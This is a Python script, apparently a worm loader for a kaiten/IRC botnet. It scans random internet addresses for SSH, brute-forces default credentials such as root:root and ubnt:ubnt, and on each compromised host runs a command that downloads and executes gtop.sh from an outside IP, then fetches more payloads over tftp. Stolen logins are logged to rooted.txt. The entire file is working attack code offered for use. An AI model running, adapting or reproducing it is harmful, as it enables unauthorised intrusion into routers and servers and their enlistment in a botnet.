#!/usr/bin/env python
#
#-Put the files in your htdocs directory of a server to host them named something sensible like kaiten-*, wildcard in place of the architecture name.
# Set some stuff on your servers so you don't get capped at 476 open SSH connections.
#-ulimit -n 99999
#-sysctl -w fs.file-max=100000
# Run heavyhidra
#-python infect.py 376 LUCKY x 0
#-python infect.py 376 B 113.53 1
 
 
import threading, paramiko, random, socket, time, sys
 
paramiko.util.log_to_file("/dev/null") #Prevents paramiko error spam.
 
files = [ #Files in which we would like to execute upon the routers.
    "gtop.sh",
 
 
]
 
website = "208.67.1.182" #Public facing IP hosting the IRC bot binaries.
 
reservedips = [ #Majestic list of reserved IP's we have no reason to scan. Actually quite dull.
 'http://127.',
 'http://0',
 'http://10.',
 'http://100.64',
 'http://100.65',
 'http://100.66',
 'http://100.67',
 'http://100.68',
 'http://100.69',
 'http://100.70',
 'http://100.71',
 'http://100.72',
 'http://100.73',
 'http://100.74',
 'http://100.75',
 'http://100.76',
 'http://100.77',
 'http://100.78',
 'http://100.79',
 'http://100.80',
 'http://100.81',
 'http://100.82',
 'http://100.83',
 'http://100.84',
 'http://100.85',
 'http://100.86',
 'http://100.87',
 'http://100.88',
 'http://100.89',
 'http://100.90',
 'http://100.91',
 'http://100.92',
 'http://100.93',
 'http://100.94',
 'http://100.95',
 'http://100.96',
 'http://100.97',
 'http://100.98',
 'http://100.99',
 'http://100.100',
 'http://100.101',
 'http://100.102',
 'http://100.103',
 'http://100.104',
 'http://100.105',
 'http://100.106',
 'http://100.107',
 'http://100.108',
 'http://100.109',
 'http://100.110',
 'http://100.111',
 'http://100.112',
 'http://100.113',
 'http://100.114',
 'http://100.115',
 'http://100.116',
 'http://100.117',
 'http://100.118',
 'http://100.119',
 'http://100.120',
 'http://100.121',
 'http://100.122',
 'http://100.123',
 'http://100.124',
 'http://100.125',
 'http://100.126',
 'http://100.127',
 'http://169.254',
 'http://172.16.',
 'http://172.17.',
 'http://172.18.',
 'http://172.19.',
 'http://172.20.',
 'http://172.21.',
 'http://172.22.',
 'http://172.23.',
 'http://172.24.',
 'http://172.25.',
 'http://172.26.',
 'http://172.27.',
 'http://172.28.',
 'http://172.29.',
 'http://172.30.',
 'http://172.32.',
 'http://192.0.0.0',
 'http://192.0.0.1',
 'http://192.0.0.2',
 'http://192.0.0.3',
 'http://192.0.0.4',
 'http://192.0.0.5',
 'http://192.0.0.6',
 'http://192.0.0.7',
 'http://192.0.2.',
 'http://192.88.99.',
 'http://192.168.',
 'http://198.18.',
 'http://198.19.',
 'http://198.51.100.',
 'http://203.0.113.',
 'http://224.',
 'http://225'
]
lucky = ["37.237","37.238","37.239","37.236","191.53","186.208","191.53","186.208","1.0","177.137","177.38","101.108","125.27","177.44","179.189","179.97"]
passwords = [ #Some default SSH logins.
    "root:root",
    "root:admin",
    "admin:admin",
    "ubnt:ubnt",
    "root:password",
    "root:toor"
]
 
print sys.argv[0]+' Threads[max 376] A/B/C(ip class) /RAND IPHERE(1/1.1/1.1.1) 0/1 (password list, root:root) (doesn\'t scan recursively)' #Lack of basic system arguments/coded two years ago. Don't hate.
 
if sys.argv[4] == '1':
    passwords = [ "admin:1234", "root:root", "root:password", "root:12356", "admin:admin" ] #Faster exploitation with somewhat less results.

if sys.argv[4] == 'K':
    passwords = [ "root:test", "root:root" ]

ipclassinfo = sys.argv[2]
if ipclassinfo == "A":
    ip1 = sys.argv[3]
elif ipclassinfo == "B":
    ip1 = sys.argv[3].split(".")[0]
    ip2 = sys.argv[3].split(".")[1]
elif ipclassinfo == "C":
    ips = sys.argv[3].split(".")
    num=0
    for ip in ips:
        num=num+1
        if num == 1:
            ip1 = ip
        elif num == 2:
            ip2 = ip
        elif num == 3:
            ip3 = ip
class sshscanner(threading.Thread):
    global passwords
    global ipclassinfo
    if ipclassinfo == "A":
        global ip1
    elif ipclassinfo == "B":
        global ip1
        global ip2
    elif ipclassinfo == "C":
        global ip1
        global ip2
        global ip3
    def run(self):
        while 1:
            try:
                while 1:
                    thisipisbad='no'
                    if ipclassinfo == "A":
                        self.host = 'http://'+ip1+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    elif ipclassinfo == "B":
                        self.host = 'http://'+ip1+'.'+ip2+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    elif ipclassinfo == "C":
                        self.host = 'http://'+ip1+'.'+ip2+'.'+ip3+'.'+str(random.randrange(0,256))
                    elif ipclassinfo == "LUCKY":
                        self.host = 'http://'+random.choice(lucky)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    else:
                        self.host = 'http://'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    for badip in reservedips:
                        if badip in self.host:
                            thisipisbad='yes'
                    if thisipisbad=='no':
                        break
                self.host=self.host.replace('http://', '') #This could be optimized. This is bad code. No idea why I did it like this.
                username='root'
                password="0"
                port = 22
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((self.host, port))
                s.close()
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                dobreak=False
                for passwd in passwords:
                    if ":n/a" in passwd:
                        password=""
                    else:
                        password=passwd.split(":")[1]
                    if "n/a:" in passwd:
                        username=""
                    else:
                        username=passwd.split(":")[0]
                    try:
                        ssh.connect(self.host, port = port, username=username, password=password, timeout=3)
                        dobreak=True
                        break
                    except:
                        pass
                    if True == dobreak:
                        break
                badserver=True
                stdin, stdout, stderr = ssh.exec_command("/sbin/ifconfig")
                output = stdout.read()
                if "inet addr" in output:
                    badserver=False
                websites = [ ]         
                if badserver == False:
                        print '\x1b[31mInfected:'+username+'<'+password+'>'+self.host+'|'+str(port)
                        ssh.exec_command("cd /tmp; rm -rf *;busybox wget -q http://208.67.1.182/gtop.sh; chmod +x gtop.sh; sh gtop.sh; rm -rf *; busybox tftp -r tftp.sh -g ; sh tftp.sh; busybox tftp -c get tftp2.sh; sh tftp2.sh\r\n")
			infectedip = open("rooted.txt","a").write(username+":"+password+":"+self.host+"\n")
                        time.sleep(30)
			ssh.close()
            except:
                pass
 
for x in range(0,int(sys.argv[1])): #This may abuse your system resources and anger network administrators.
    try:
        t = sshscanner()
        t.start()
    except:
        pass